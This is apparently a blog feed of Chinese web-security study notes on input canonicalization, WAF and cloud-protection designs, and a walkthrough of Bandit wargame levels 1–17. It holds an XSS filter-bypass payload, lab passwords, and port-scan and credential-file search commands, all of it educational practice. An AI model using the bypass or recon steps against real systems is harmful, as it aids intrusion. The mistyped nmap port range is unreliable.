<h2 id="3-3确认用户应用边界"><a href="#3-3确认用户应用边界" class="headerlink" title="3.3确认用户应用边界"></a>3.3确认用户应用边界</h2><p>仅利用JS脚本来检查用户输入内容完全无法保证到达服务器的数据一定符合要求。服务器端应用程序第一次收到用户数据的地方是一个<strong>重要的信任边界</strong>，应用程序需要在此采取措施防御恶意输入。</p>
<p><strong>边界确认</strong>是一种更加有效的模型。此时，服务器端应用程序的每一个单独组件或功能应将用户输入参数当作潜在的恶意来源。除客户端与服务器之间的外部边界外，Web应用程序在上述每一个信任边界上执行数据合法性确认。</p>
<h2 id="3-4处理流程规范化"><a href="#3-4处理流程规范化" class="headerlink" title="3.4处理流程规范化"></a>3.4处理流程规范化</h2><p>在确认检查过程中，当需要在<strong>几个步骤中处理用户提交的输入</strong>时，就会出现一个输入处理机制经常遇到的问题，即<strong>如何确认用户数的参数完全合法</strong>。如果不谨慎处理该过程，攻击者就能寻找到有效的绕过方式，使得恶意数据成功避开Web应用的防护机制。例如，Web应用试图通过删除用户输入参数中的某些非法字符或表达式来过滤用户输入参数时，就会出现这种问题。</p>
<p>以防御某些跨站点脚本攻击的方法为例，应用程序可能会从任何用户提交的数据中删除表达式：</p>
<hr>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br></pre></td></tr></table></figure>

<hr>
<p>但攻击者可应用以下输入避开过滤器：</p>
<hr>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure>

<p>数据规范化会造成另外一个问题。当用户浏览器发起HTTP请求时，浏览器会将请求中的用户参数进行各种形式的编码。HTTP协议之所以使用URL编码等方案，是为了能够通过HTTP协议传送不常见的字符与二进制数据。在这个过程中，Web应用<strong>需提前将这类编码数据进行规范的转换</strong>。如果在对用户参数过滤之后再执行编码转换，攻击者就可以通过使用编码方式避开现有的防护机制。</p>
<p>安全开发流程的核心思想是：在遵循系统功能要求的基础上，需在<strong>系统内部链接、外部传参点等各个环节中，实现标准化的防护方式及业务流程</strong>。重点在于系统交互功能的设计上。这样可在开发阶段降低各类安全风险，一方面可保证系统的稳定运行，另一方面也可减少安全防护的资金投入。</p>
]]></content>
      <categories>
        <category>Web安全防护体系</category>
        <category>《WEB安全基础》</category>
      </categories>
      <tags>
        <tag>《WEB安全基础》</tag>
        <tag>Web安全防护体系</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB防护技术与体系</title>
    <url>/2023/06/12/WEB%E9%98%B2%E6%8A%A4%E6%8A%80%E6%9C%AF%E4%B8%8E%E4%BD%93%E7%B3%BB/</url>
    <content><![CDATA[<p>基本安全防护手段，比如防火墙的部署，防火墙通常部署在网络出口，用以对网络内外交互的行为进行过滤，过滤规则基于五元组“源IP、目的IP、源MAC、目的MAC、端口号”。这种简单粗暴的过滤方式在早期行之有效。</p>
<p>但是，由于Web应用依托于应用层的HTTP\HTTPS进行开展，应用层对之下各层表现为同一端口，因此导致利用防火墙来为Web应用提供防护基本无效。主要原因是在传统防护规范中，基于TCP&#x2F;IP的<strong>五元组位于OSI七层框架中第二、三、四层</strong>（TCP&#x2F;IP模型的前三层），<strong>而Web应用位于OSI第七层</strong>（TCP&#x2F;IP模型第四层）</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619152924286.png"></p>
<p>防火墙对Web应用层面的攻击（SQL注入、XSS、upload等）基本没有防护效果。因此，利用防火墙只能对<strong>网络的边界处</strong>提供通用防护，但无法针对Web应用进行防护。目前，下一代防火墙（Next Generation Firewall）可以实现针对应用层威胁的防护。因此这里所说的防火墙是指<strong>传统的包过滤防火墙</strong>。</p>
<h1 id="1-硬件WAF"><a href="#1-硬件WAF" class="headerlink" title="1.硬件WAF"></a>1.硬件WAF</h1><p>硬件WAF在部署时会<strong>尽可能靠近需要防护的Web服务器，并放置在Web服务器之前，采用串联的方式部署在网络中</strong>。很多情况下，WAF需要同时支持对多台服务器的防护，这时候可<strong>利用路由策略将HTTP流量引入WAF，待WAF检测完成后再发送给服务器。</strong>WAF<strong>重点针对进出Web服务器的HTTP流量进行过滤</strong>，并针对HTTP流量中的攻击行为采取阻断或告警措施。由于攻防技术不断演进，WAF系统也会定期升级，并更新各类防护策略及漏洞插件，以适应日益变更的网络攻防形态。</p>
<p>WAF在防护方面主要有以下两个比较具有争议的特点。</p>
<blockquote>
<p><strong>1.代理模式</strong></p>
<p>这种模式下，将设备部署在Web服务器前端，可将Web网站缓存到设备中，并由WAF对用户的Web请求进行响应。而且，WAF也会定期对Web网站页面进行检查，确认网站是否安全，是否存在篡改行为等。此模式在设计之初预期非常好，希望WAF充当用户与站点之间的缓冲带。但由于WAF本身并不参与Web系统服务器的工作，因此当面对用户的交互请求时，仍会由被防护的Web服务器进行响应。因此，在实际工作中开启此模式的WAF设备也相对较少。</p>
</blockquote>
<blockquote>
<p><strong>2.在线攻击防护效果</strong></p>
<p>WAF设计之初的目标就是针对SQL注入、XSS等在线攻击行为进行防护。WAF<strong>常用的方式是利用关键字匹配</strong>，通过内置的Web漏洞及攻击行为特征对用户请求进行检测。这样做的问题是误报率较高，且会阻断正常用户行为。目前，新型的WAF设备具备了自学习及类似功能，可利用<strong>机器学习的方式来扩展防护的规则库</strong>，防护效果有较明显的提升。</p>
</blockquote>
<p>WAF的额外功能很多，如爬虫检测功能、DDoS攻击识别功能、漏洞专项防护等。但是其标准防护技术就是疑似行为匹配。<strong>WAF内部会建立大量的规则库，</strong>涵盖各种漏洞类型的常见攻击特征、关键代码等。然后，利用正则表达式实现快速识别。当然，也会针对高危漏洞编写特定检测插件，以便精确识别当前攻击并做出防护。</p>
<p>硬件WAF的防护思路及方案非常适合为互联网的Web应用提供防护，但事实并非如此。通常来说，WAF的性能最高能够达到Gbps级别，这主要取决于检查深入程度及设备延迟。设备延迟过高会对用户体验造成极大的影响。同时作为一款硬件设备，WAF需部署在Web服务器前端，这样在网络内就形成了一个单点情况，俗称“单点故障点”。在这种情况下，如果WAF出现硬件、系统故障情况，极可能导致网络中断。</p>
<p>为了解决这个问题，目前WAF产品均具有<strong>双机热备&#x2F;互备功能。</strong>依赖于通用的VRRP热备协议或其他标准，在网络内可实现多台设备的相互虚拟，由协议自动监控设备状态并自动切换链路。同时设备支持硬&#x2F;软件bypass（一种断电网络连通机制，避免由于设备宕机后网络中断），采取双电源等模式，尽可能保障网络的通畅。在设备实际部署中，需根据真实的服务情况进行合理的网络配置，</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619162122751.png" alt="WAF在线部署示意图"></p>
<h2 id="1-1常用的防护规则"><a href="#1-1常用的防护规则" class="headerlink" title="1.1常用的防护规则"></a>1.1常用的防护规则</h2><p>有效的防护规则是WAF识别和阻止已知攻击的主要检测手段，也是WAF在线识别攻击的重要保证。标准的WAF规则所提供的防护功能主要包括以下方面：</p>
<p>1.针对用户行为的识别</p>
<blockquote>
<p>·在线爬虫识别</p>
<p>·用户访问频率及特征</p>
<p>·DDoS识别</p>
</blockquote>
<p>2.基础攻击的防护</p>
<blockquote>
<p>·SQL注入防护</p>
<p>·XSS（跨站脚本）攻击防护</p>
<p>·跨站请求伪造防护</p>
<p>·文件内容安全防护</p>
<p>·命令执行漏洞防护</p>
<p>·远程文件包含防护</p>
</blockquote>
<p>3.定向漏洞利用防护</p>
<blockquote>
<p>·Web服务器漏洞防护</p>
<p>·Web插件漏洞防护</p>
</blockquote>
<p>伴随的主动检测方法有以下几种：</p>
<p>1.网络行为归类</p>
<p>正常的访问流量中，用户的正常流量占据主要份额。因此，WAF可将正常行为进行归类识别，并形成对应正常行为的字符串。再利用识别后得到的字符串进行匹配，对通过设备的流量进行预筛选，提高检测效率。</p>
<p>2.不同位置的主动检测</p>
<p>主动检测技术可通过在任意的HTTP头部字段、HTTP BODY字段中插入flag的方式对敏感行为进行标记，并针对后续行为进行观察，确认流量的合法性。</p>
<p>3.多种检测条件的逻辑组合</p>
<p>WAF支持将多个检测条件组合使用，并支持复杂规则的定义，用于为各类站点提供定制化的防护体系。</p>
<p>4.支持自定义规则</p>
<p>支持正则表达式、可在复杂业务场景下实现防护规则的自定义。</p>
<p>总体来说，WAF为Web站点提供了良好的安全防护效果，并为各种不同类型及应用的Web系统提供了一体化的防护解决方案。因此在使用这类设备时，要根据业务特性选择适用的规则，并且可根据自身站点的情况进行规则的自定义，以发挥设备最大的防护效果。</p>
<h2 id="1-2Apache-ModSecurity"><a href="#1-2Apache-ModSecurity" class="headerlink" title="1.2Apache ModSecurity"></a>1.2Apache ModSecurity</h2><p>ModSecurity是一个免费、开源的Apache模块，其功能是过滤各类在线攻击，因此可作为Web应用防火墙（WAF）使用。ModSecurity是一个入侵探测与阻止的引擎，它主要用于Web应用程序，所以也可以叫做Web应用程序防火墙。其官网地址为：<a href="http://www.modsecurity.org/%E3%80%82">http://www.modsecurity.org/。</a></p>
<p>需要说明的是，OWASP是一个安全社区，开发和维护着一套免费的应用程序保护规则，这就是OWASP的ModSecurity的<strong>核心规则集</strong>（即CRS）。可以通过ModSecurity手工创建安全过滤器、定义攻击并实现主动的安全输入验证。</p>
<blockquote>
<p>在实际应用中，利用ModSecurity对在线Web服务提供防护的场景并不很多，大多数安全运维人员反馈ModSecurity会极大降低当前服务器的性能，严重时会对正常的Web应用产生较大影响，包括访问延迟、可接受的并发连接极大减少等。这里暂不考虑这类问题，只是针对ModSecurity的防护原理及效果进行探讨，具体情况请根据实际的环境选择使用。</p>
</blockquote>
<p>ModSecurity的CRS提供了非常多的防护策略，如引入第三方IP信誉库来鉴别访问请求的合法性，并支持利用爬虫技术及防病毒技术保护服务器的安全，及针对各类Web攻击的防护脚本。以SQL注入防护模块为例，</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619162551197.png" alt="部分SQL注入防护规则"></p>
<p>常见的SQL注入攻击的payload种类均已包含在其中，这类<strong>利用黑名单手段来过滤参数语句的防护效果主要取决于payload的涵盖范围</strong>。因此，也可根据自有Web的情况来添加额外的payload，从而实现良好的防护效果。针对其他Web漏洞的防护思路也与此类似。总体来说<strong>，Modsecurity仍以关键字检查及防护过滤为主，并没有添加过多的动态流及业务效果的展示。</strong>而且，Modsecurity对性能的影响比较明显，因此在商业实践环境中利用的场景并不多，在防护效果上也可近似将Modsecurity<strong>理解为初级的软件WAF效果</strong>，建议在中小站点或内网访问量有限的环境下使用。</p>
<p>Modsecurity在易用程度方面有所欠缺，且由于Modsecurity仅适用于Apache，因此推荐使用国内的相关软件实现上述效果，这里推荐使用<strong>安全狗</strong>（<a href="http://www.safedog.cn/%EF%BC%89%E3%80%81D%E7%9B%BE%EF%BC%88http://www.d99net.net/%EF%BC%89%E7%AD%89%E9%98%B2%E6%8A%A4%E7%B1%BB%E5%B7%A5%E5%85%B7%E8%BF%9B%E8%A1%8C%E9%98%B2%E6%8A%A4%E5%B7%A5%E4%BD%9C%E3%80%82">http://www.safedog.cn/）、D盾（http://www.d99net.net/）等防护类工具进行防护工作。</a></p>
<h2 id="1-3防篡改软件"><a href="#1-3防篡改软件" class="headerlink" title="1.3防篡改软件"></a>1.3防篡改软件</h2><p>防篡改软件的防护思路为：<strong>定期对Web页面进行监测，如发现异常，则立即告警并恢复页面</strong>。</p>
<p>通过直接监测页面，有异常直接告警并恢复，可保证Web应用的顺利开展。但是，防篡改软件仅仅能实现这类功能。</p>
<p>常见的防篡改检测方式有以下几种。</p>
<p>1）定期轮询方式</p>
<blockquote>
<p>用一个网页读取和检测程序，以<strong>轮询</strong>方式读出要监控的网页，与已经缓存好的真实网页进行比较，从而判断网页内容的完整性，<strong>对其中的修改内容进行合法性判断</strong>，并对被篡改的网页进行报警和恢复。</p>
</blockquote>
<p>（2）软件监控方式</p>
<blockquote>
<p>将篡改检测模块安装在Web服务器中，针对每次访问都进行完整性检查。<strong>对篡改网页及在线攻击行为进行实时访问阻断</strong>，并予以报警和恢复。在使用效果方面，这种方式类似于使用一套WAF系统，只不过是以软件形式，部署在服务器的网卡出口处进行防护。</p>
</blockquote>
<p>（3）事件触发方式</p>
<blockquote>
<p>利用操作系统的文件系统或驱动程序接口，通过程序检测网页文件当前状态。<strong>在网页文件被修改时进行合法性检查</strong>，对于非法操作进行报警和恢复。</p>
</blockquote>
<p>目前防篡改软件<strong>仅为事后防护机制</strong>。因此不推荐仅使用具有防篡改功能的防护类型工具。这只能解决表面的业务问题，对系统内的木马等情况，并没有很好的解决手段。当然，新的防护软件均附带监控攻击现状等功能，相当于在服务器层面安装了一套WAF，可实现在线的防护，而且也有相关免费软件的支持，如<strong>安全狗</strong>。</p>
<h2 id="1-4云防护系统"><a href="#1-4云防护系统" class="headerlink" title="1.4云防护系统"></a>1.4云防护系统</h2><p>针对中小规模网站的实际情况，受制于成本因素，通常会选择网络上的虚拟空间或虚拟主机来部署Web应用。但是，这又会受到虚拟空间或虚拟主机本身资源或各方面的限制，直接部署各类防护软件也不太现实；或者由于本地机房硬件条件的限制，无法额外部署一套硬件WAF设备进行防护。由于日常访问量较小，直接部署一套专业的商业WAF设备也意味着安全投入产出比并不十分理想。</p>
<p>为了解决硬件WAF成本过高、性能不佳以及需要机房环境等问题，研究人员开发了云防护系统。<strong>其防护思路为：网站管理者先将自己的域名解析地址指向云防护系统，那么在用户访问网站时，其访问的物理地址就变成了云防护系统的地址。云防护系统对用户的请求进行过滤后，再将请求发送给真实的Web服务器，从而实现在线防护。</strong></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619164037788.png" alt="云防护系统的DNS解析"></p>
<p>在云防护系统的安全防护基础之上，传统的Web防护体系配合云的能力，可提供更加丰富的增值防护服务。例如，利用云的高性能及高带宽实现在线DDoS攻击流量过滤、实现在线缓存及备份功能等。而且管理方式简单易行，对Web应用无任何影响，适合个人用户及中小站点用户使用。</p>
<p>在防护效果方面，云防护系统在针对Web漏洞的防护方面与传统的WAF设备相比并没有大大区别，仍是以标准的漏洞防护方式（以参数过滤、参数转义）为主。因此，在防护效果方面，云防护系统与传统设备并没有明确的好坏之分，均可以提供在线防护能力。以国内某云防护系统为例，其针对在线攻击的防护效果良好。</p>
<p>综上，云防护系统主要优势在于：</p>
<blockquote>
<p>·基于云的硬件资源可有效保障防护性能，避免了传统设备由于硬件性能产生的网络瓶颈。</p>
<p>·只针对域名进行防护，这样也可支持CDN等方式，用户体验更佳。</p>
<p>·无需硬件设备，可有效减少用户的初始投资。</p>
<p>·基于大数据的防护样本分析，防护效果会进一步提升。</p>
</blockquote>
<p>当然，利用云防护系统还可较为简单地达到多Web应用的集中化管理的效果。相对于传统设备的规则库升级，集中管理的优势是可以将高危漏洞的响应时间缩短到小时级别，防护效果也能很好提升，并且给用户较多的防护选择空间。在实际安全防护工作开展中，可根据Web系统的真实防护需求选择使用。</p>
]]></content>
      <categories>
        <category>《WEB安全基础》</category>
        <category>WEB防护技术与体系</category>
      </categories>
      <tags>
        <tag>《WEB安全基础》</tag>
        <tag>WEB防护技术与体系</tag>
      </tags>
  </entry>
  <entry>
    <title>Web源码拓展</title>
    <url>/2023/05/20/Web%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/</url>
    <content><![CDATA[<h1 id="Web源码"><a href="#Web源码" class="headerlink" title="Web源码"></a>Web源码</h1><h2 id="1-目录结构"><a href="#1-目录结构" class="headerlink" title="1.目录结构"></a>1.目录结构</h2><h2 id="2-脚本类型"><a href="#2-脚本类型" class="headerlink" title="2.脚本类型"></a>2.脚本类型</h2><p>ASP&#x2F;PHP&#x2F;ASPX&#x2F;JSP&#x2F;JAVAWEB&#x2F;python</p>
<h2 id="3-应用分类"><a href="#3-应用分类" class="headerlink" title="3.应用分类"></a>3.应用分类</h2><p>门户-综合类漏洞</p>
<p>电商-业务逻辑突出</p>
<p>论坛-xss逻辑突出</p>
<p>博客-漏洞较少</p>
<p>第三方-功能决定</p>
<h2 id="4-其他补充"><a href="#4-其他补充" class="headerlink" title="4.其他补充"></a>4.其他补充</h2><p>框架或非框架-框架漏洞或代码漏洞</p>
<p>CMS识别-即是否套用了模板</p>
<p>开源-找漏洞和审计</p>
<p>内部-渗透测试</p>
<p>源码获取-搜索&#x2F;淘宝&#x2F;github</p>
]]></content>
      <categories>
        <category>web漏洞</category>
      </categories>
      <tags>
        <tag>Web源码拓展</tag>
      </tags>
  </entry>
  <entry>
    <title>bandit(level 0-19)</title>
    <url>/2023/05/14/bandit-level-0-19/</url>
    <content><![CDATA[<h1 id="bandit"><a href="#bandit" class="headerlink" title="bandit"></a>bandit</h1><h2 id="字符作用"><a href="#字符作用" class="headerlink" title="字符作用"></a>字符作用</h2><blockquote>
<p>| 表示管道，上一条命令的输出，作为下一条命令参数，通常用来过滤&#x2F;汇总数据。</p>
</blockquote>
<blockquote>
<p>&amp;&amp;表示前一条命令执行成功时，才执行后一条命令；反之，前面的命令执行失败，则&amp;&amp;后面的命令不会被执行。</p>
</blockquote>
<blockquote>
<p>&amp;表示任务在后台执行，即使ssh窗口关闭，服务依然会在后台持续运行。</p>
</blockquote>
<blockquote>
<p>||表示上一条命令执行失败后，才执行下一条命令。一旦执行到一条成功的命令，后面用****||****连接的命令，就不会再被执行。</p>
</blockquote>
<blockquote>
<p>＞把正常信息（剔除错误信息）重定向到另一个文件内</p>
<p><em><strong>*2&gt;*</strong></em> &#x2F;dev&#x2F;null意思就是把错误输出到“黑洞” ，不会显示在屏幕上。</p>
</blockquote>
<p><a href="https://blog.csdn.net/succing/article/details/127355545?ops_request_misc=%7B%22request_id%22:%22168405323416800215011812%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168405323416800215011812&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-127355545-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=linux">Linux技巧(六)：命令尾部&amp;的作用 &amp;&amp;、|、||、；、()、&amp;＞、 2＞&amp;1 的用法和区别，很实用_linux &amp;_血煞长虹的博客-CSDN博客</a></p>
<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>我用的windows，下载了mobaXterm用于进行ssh连接</p>
<p>是说level 1的密码呢在readme文件中，用到cat 找出来即可</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513211057882.png" alt="image-20230513211057882"></p>
<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>exit，然后r，重新建立连接，login as bandit1，密码是上级找到的</p>
<p>密码在虚线文件名中，这时候cat -就不管用了。指定文件完整路径即可。</p>
<p><img src="/image-20230513212947940.png" alt="image-20230513212947940"></p>
<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>文件名有空格</p>
<p>使用引号括起来</p>
<p><img src="/image-20230513214101452.png" alt="image-20230513214101452"></p>
<p>aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG</p>
<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>说是在inhere目录下的隐藏文件中</p>
<p>需要用到ls -a命令查看隐藏</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513214557871.png" alt="image-20230513214557871"></p>
<p>2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe</p>
<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>在inhere目录下，只有一个唯一可读的文件</p>
<p>由于文件名都有规律，且有特殊符号，于是我用了 cat .&#x2F;-file0{0,1,2…9}的方法，也就是在末尾3个之间，再cat .&#x2F;-file07试试，有了</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513221122380.png" alt="image-20230513221122380"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513221420135.png" alt="image-20230513221420135"></p>
<p>lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR</p>
<p>正解操作是：</p>
<p>file .&#x2F;-file* 查看文件类型</p>
<p>cat .&#x2F;-file07</p>
<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>密码存储文件在inhere目录下，且可读、1033bytes、不可执行</p>
<p>inhere目录下有将近20个目录，一个个来不太现实，用到du命令</p>
<p>du : 显示每个文件和目录的磁盘使用空间~~~文件的大小。</p>
<p>命令参数：</p>
<p>-a   #显示目录中文件的大小  单位 KB 。</p>
<p>-b  #显示目录中文件的大小，以字节byte为单位。</p>
<p>-c  #显示目录中文件的大小，同时也显示总和；单位KB。</p>
<p>-k 、 -m  #显示目录中文件的大小，-k 单位KB，-m 单位MB.</p>
<p>-s  #仅显示目录的总值，单位KB。</p>
<p>-h  #以K  M  G为单位显示，提高可读性~~~（最常用的一个~也可能只用这一个就满足需求了）<br><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513223236240.png" alt="image-20230513223236240"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513223206962.png" alt="image-20230513223206962"></p>
<p>du -a -b</p>
<p>cat .&#x2F;maybehere07&#x2F;.file2</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513223351281.png" alt="image-20230513223351281"></p>
<p>P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU</p>
<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>被存在服务器的某处，由用户bandit7所有，bandit6组所有，33bytes</p>
<p>find基本用法：find [PATH] [option] [action]  </p>
<p>-user name : 列出文件所有者为name的文件<br>        -group name : 列出文件所属用户组为name的文件<br>        -uid n : 列出文件所有者为用户ID为n的文件<br>        -gid n : 列出文件所属用户组为用户组ID为n的文件  </p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514112457648.png" alt="image-20230514112457648"></p>
<p>可以使用 <strong>2&gt;&#x2F;dev&#x2F;null</strong> 将错误信息重定向</p>
<p><code>find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514112752119.png" alt="image-20230514112752119"></p>
<p>参考<a href="https://www.jianshu.com/p/bf8cc6b0efd1">【bandit】WarGame之bandit通关日志 - 简书 (jianshu.com)</a></p>
<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>在data.txt文件中内容为<strong>millionth</strong>的那一行中</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514114655477.png" alt="image-20230514114655477"></p>
<p>TESKZC0XvTetK0S9xNwm25STk5iWrBvP</p>
<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>在data.txt中，仅出现一次的行文本中</p>
<p>sort与uniq命令</p>
<p>sort排序，</p>
<p>uniq是去掉相邻的重复行，-c统计次数，-u显示不重复的行</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514115858357.png" alt="image-20230514115858357"></p>
<p>-c找出现次数为1的即可</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514115916436.png" alt="image-20230514115916436"></p>
<p>参考：<a href="https://www.jianshu.com/p/bf8cc6b0efd1">【bandit】WarGame之bandit通关日志 - 简书 (jianshu.com)</a></p>
<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>在data.txt文件中的少数几个人类可读的字符串中，前面有几个&#x3D;符号</p>
<p>一般查看有乱码</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514121138624.png" alt="image-20230514121138624"></p>
<p><code>用strings data.txt</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514121241304.png" alt="image-20230514121241304"></p>
<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>data.txt文件中，但是包含base64编码</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514121610805.png" alt="image-20230514121610805"></p>
<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>data.txt文件中，但是rot13加密</p>
<p>tr命令：对输入字符进行替换、压缩和删除</p>
<p>将所有的字符向后移动13位,但要保持大写和小写</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514122106548.png" alt="image-20230514122106548"></p>
<p>参考：[使用ROT13加密解密_tr解rot13_apersonlikep的博客-CSDN博客](<a href="https://blog.csdn.net/apersonlikep/article/details/89332063?ops_request_misc=%7B%22request_id%22:%22168403789316800182732613%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168403789316800182732613&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-89332063-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=linux">https://blog.csdn.net/apersonlikep/article/details/89332063?ops_request_misc=%7B%22request%5Fid%22%3A%22168403789316800182732613%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=168403789316800182732613&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-89332063-null-null.142^v87^control_2,239^v2^insert_chatgpt&amp;utm_term=linux</a> rot13&amp;spm&#x3D;1018.2226.3001.4187)</p>
<h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>是data.txt文件，但是反复压缩，十六进制转储。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514122659959.png" alt="image-20230514122659959"></p>
<p>xxd命令：转二级制、十六进制</p>
<p>mv命令：重命名</p>
<p>gzip&#x2F;bzip2 -d&#x2F;tar -xvf命令：解压缩</p>
<p>先转二级制</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514123813942.png" alt="image-20230514123813942"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514123825354.png" alt="image-20230514123825354"></p>
<p>重命名gz、解压</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514123946806.png" alt="image-20230514123946806"></p>
<p>重命名bz2、解压</p>
<p><img src="/image-20230514124152671.png" alt="image-20230514124152671"></p>
<p>重命名gz、解压</p>
<p><img src="/image-20230514124254797.png" alt="image-20230514124254797"></p>
<p>重命名tar、解压</p>
<p><img src="/image-20230514124423926.png" alt="image-20230514124423926"></p>
<p><img src="/image-20230514124556058.png" alt="image-20230514124556058"></p>
<p>重命名bz2，解压</p>
<p><img src="/image-20230514124733776.png" alt="image-20230514124733776"></p>
<p>重命名tar、解压</p>
<p><img src="/image-20230514124850246.png" alt="image-20230514124850246"></p>
<p>重命名gz、解压</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514124956549.png" alt="image-20230514124956549"></p>
<h2 id="ssh、telnet、nc、openssl、nmap工具篇"><a href="#ssh、telnet、nc、openssl、nmap工具篇" class="headerlink" title="ssh、telnet、nc、openssl、nmap工具篇"></a>ssh、telnet、nc、openssl、nmap工具篇</h2><h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>在**&#x2F;etc&#x2F;bandit_pass&#x2F;bandit14**中，且只能由bandit14用户读取。且提供了一个私有SSH密钥。</p>
<!--ssh -i 秘钥文件名称 root@远程IP地址-->

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514130400052.png" alt="image-20230514130400052"></p>
<p>报错了，看不懂，但是看到绿字说22端口登录是不支持的，于是换个端口。</p>
<p>加了个-p 2220，虽然也报错，但还是提示连到了</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514132248403.png" alt="image-20230514132248403"></p>
<p>查看即可</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514132359501.png" alt="image-20230514132359501"></p>
<p>fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq</p>
<h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p>连接到本机，且端口为30000提交密码</p>
<p>telnet ip地址 端口</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514133034901.png" alt="image-20230514133034901"></p>
<p>jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt</p>
<h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><p>在localhost，端口为30001处提交上关密码，且有ssl加密</p>
<p>openssl：多用途、跨平台密码工具</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514133923601.png" alt="image-20230514133923601"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514133934323.png" alt="image-20230514133934323"></p>
<p>JQttfApK4SeyHwDlI9SXGR50qclOAil1</p>
<h2 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h2><p>目的是获取证书，将上一级的密码发送至端口范围为31000到32000的localhost上。1.找出有哪些端口是服务器监听着的；2.找出哪些是使用SSL的；3.只有一个服务器是会给你下一级证书的，其它的只会重复你发给它的。</p>
<p>知识点：端口扫描</p>
<p><code>nmap localhost -p310000-320000</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515113201632.png" alt="image-20230515113201632"></p>
<p><code>openssl s_client -connect localhost:port</code>对上述端口依次尝试，并提交密码</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515114635689.png" alt="image-20230515114635689"></p>
<p>port为31790时</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515114912840.png" alt="image-20230515114912840"></p>
